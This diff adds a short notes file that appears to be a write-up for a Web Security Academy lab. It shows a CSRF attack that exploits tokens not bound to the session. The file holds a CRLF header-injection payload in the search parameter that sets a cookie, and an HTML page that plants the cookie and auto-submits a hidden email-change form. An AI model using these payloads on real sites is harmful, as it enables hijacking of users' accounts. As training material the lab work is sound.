@@ -1,0 +1,29 @@
+// Obtain CSRF tokens from attacker accounts 
+In HTML - 9Y86hg9uxQSSQB51AjIqloQFmCQijOcE (From Session handling framework)
+In Cookie - IF3ocZN6yd7Qk40NSqEd00bE2BMu0dEt (From CSRF framework)
+
+In HTML - 12dGlCai9BIdDg6jZ9uuPxZpMfLKrXsm
+In Cookie - dq90hqYoTDOx2EnOWyppBZx8YXhDhK4z
+// Observed that when logon as a user, and try to change email with another person's set of CSRF tokens will still work
+// CSRF tokens not tied to session
+
+// Discovered a vulnerability at search functionality that search term is reflected in response's Set-Cookie header
+search=kiddie%0d%0aSet-Cookie:%20csrfKey=dq90hqYoTDOx2EnOWyppBZx8YXhDhK4z
+
+// Create an fake HTML to inject cookie and  simulate the POST request to change email on attacker site
+<html>
+<body>
+
+<img src="https://ac841fa91e68bf9880e8073500e60030.web-security-academy.net/?search=kiddie%0d%0aSet-Cookie:%20csrfKey=dq90hqYoTDOx2EnOWyppBZx8YXhDhK4z">
+
+<script>history.pushState('','','/')</script>
+<form action="https://ac841fa91e68bf9880e8073500e60030.web-security-academy.net/email/change-email" method="POST">
+<input type="hidden" name="email" value="kiddie&#64;test&#46;com">
+<input type="hidden" name="csrf" value="12dGlCai9BIdDg6jZ9uuPxZpMfLKrXsm">
+<input type="submit" value="Submit request">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>                   
+</html>
